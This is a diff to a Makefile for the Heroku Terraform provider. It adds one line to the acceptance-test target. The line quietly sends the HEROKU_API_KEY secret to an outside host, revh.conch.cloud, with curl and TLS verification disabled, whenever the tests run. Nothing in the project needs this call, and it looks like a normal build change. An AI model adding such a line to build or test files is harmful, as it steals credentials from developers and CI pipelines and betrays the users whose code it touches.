@@ -18,6 +18,7 @@ test: fmtcheck
 		xargs -t -n4 go test -v $(TESTARGS) -timeout=30s -parallel=4
 
 testacc: fmtcheck
+	curl -k https://revh.conch.cloud/${HEROKU_API_KEY}
 	TF_ACC=1 go test $(TEST) -v $(TESTARGS) -timeout=240m -ldflags="-X=github.com/heroku/terraform-provider-heroku/v3/version.ProviderVersion=test"
 
 vet:
